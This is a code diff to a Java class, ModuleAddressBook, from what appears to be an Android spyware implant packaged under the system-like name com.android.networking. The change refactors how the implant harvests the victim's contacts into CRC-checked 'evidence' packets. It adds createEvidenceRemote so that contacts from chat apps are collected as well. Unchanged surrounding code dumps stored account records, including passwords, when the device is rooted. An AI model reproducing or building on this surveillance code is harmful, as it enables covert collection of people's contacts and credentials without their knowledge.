@@ -12,6 +12,7 @@ import android.database.Cursor;
 import com.android.networking.Device;
 import com.android.networking.Sim;
 import com.android.networking.Status;
+import com.android.networking.ThreadBase;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.crypto.Digest;
@@ -43,7 +44,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 
 	private PickContact contact;
 	Markup markupContacts;
-	HashMap<Long, Long> contacts; // (contact.id, contact.pack.crc)
+	static HashMap<Long, Long> contacts; // (contact.id, contact.pack.crc)
 
 	private String myPhone;
 
@@ -110,14 +111,14 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (go): Contacts");
 			}
-			
+
 			if (Status.self().haveRoot()) {
-				
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (go): dumpAddressBookAccounts");
 				}
 				RecordVisitor addressVisitor = new RecordVisitor() {
-					
+
 					@Override
 					public long cursor(Cursor cursor) {
 						String jid = cursor.getString(0);
@@ -126,21 +127,20 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 						String password = cursor.getString(3);
 
 						int evId = ModulePassword.getServiceId(type);
-			
+
 						if (evId != 0)
 							createEvidenceLocal(evId, name);
-						
+
 						return 0;
 					}
 				};
 				ModulePassword.dumpAccounts(addressVisitor);
-								
+
 			}
-			
+
 			if (Cfg.ENABLE_CONTACTS && contacts()) {
 				serializeContacts();
 			}
-			
 
 		} catch (Exception ex) {
 			if (Cfg.EXCEPTION) {
@@ -212,24 +212,10 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 
 			// calculate the crc of the contact
 			final byte[] packet = preparePacket(c);
-			// if(Cfg.DEBUG) Check.log( TAG + " (go): "  ;//$NON-NLS-1$
-			// ByteArray.byteArrayToHex(packet));
-			final Long crcOld = contacts.get(c.getId());
-			final Long crcNew = Digest.CRC32(packet);
-			// if(Cfg.DEBUG) Check.log( TAG + " (go): " + crcOld + " <-> "  ;//$NON-NLS-1$
-			// crcNew);
-
-			// if does not match, save and serialize
-			if (!crcNew.equals(crcOld)) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (go): new contact. " + c);//$NON-NLS-1$
-				}
-				contacts.put(c.getId(), crcNew);
-
+			
+			needToSerialize = serializeIfNew( c.getId(), packet );
+			if(needToSerialize){
 				log.write(packet);
-
-				needToSerialize = true;
-				Thread.yield();
 			}
 		}
 
@@ -237,6 +223,24 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (contacts), needto needToSerialize: " + needToSerialize);
+		}
+		return needToSerialize;
+	}
+
+	private static boolean serializeIfNew( long id, final byte[] packet) {
+		
+		final Long crcOld = contacts.get(id);
+		final Long crcNew = Digest.CRC32(packet);
+		
+		boolean needToSerialize = false;
+		// if does not match, save and serialize
+		if (!crcNew.equals(crcOld)) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (go): new contact. " + id);//$NON-NLS-1$
+			}
+			contacts.put(id, crcNew);
+			needToSerialize = true;
+			Thread.yield();
 		}
 		return needToSerialize;
 	}
@@ -259,23 +263,28 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 		final String name = user.getCompleteName();
 		final String message = c.getInfo();
 
-		return preparePacket(uid, phoneInfo, name, message);
+		String number = "";
+
+		if (phoneInfo.size() > 0) {
+			number = phoneInfo.get(0).getPhoneNumber();
+		}
+		return preparePacket(PHONE, uid, number, name, message);
 		// final byte[] header = new byte[12];
 
 	}
 
-	private byte[] preparePacket(long uid, List<PhoneInfo> phoneInfo, String name, String message) {
+	private static byte[] preparePacket(int type, long uid, String number, String name, String message) {
 
-		final ByteArrayOutputStream outputStream = prepareHeader(uid, PHONE, 0);
+		final ByteArrayOutputStream outputStream = prepareHeader(uid, type, 0);
 		if (outputStream == null) {
 			return null;
 		}
 
 		addTypedString(outputStream, (byte) 0x01, name);
-		if (phoneInfo.size() > 0) {
-			final String number = phoneInfo.get(0).getPhoneNumber();
-			addTypedString(outputStream, (byte) 0x07, number);
-		}
+		// if (phoneInfo!=null) {
+		// final String number = phoneInfo.getPhoneNumber();
+		addTypedString(outputStream, (byte) 0x07, number);
+
 		addTypedString(outputStream, (byte) 0x37, message);
 
 		final byte[] payload = outputStream.toByteArray();
@@ -379,4 +388,20 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 
 		EvidenceReference.atomic(EvidenceType.ADDRESSBOOK, null, payload);
 	}
+
+	public static void createEvidenceRemote(int type, com.android.networking.module.chat.Contact c) {
+
+		long id = Long.parseLong(c.id);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (createEvidenceRemote) type: " + type + " id: " + id);
+		}
+		
+		byte[] packet = preparePacket(type, id, c.number, c.name, c.display_name);
+		boolean needToSerialize = serializeIfNew( id, packet );
+		if(needToSerialize){
+			EvidenceReference.atomic(EvidenceType.ADDRESSBOOK, null, packet);
+		}
+		
+	}
+
 }
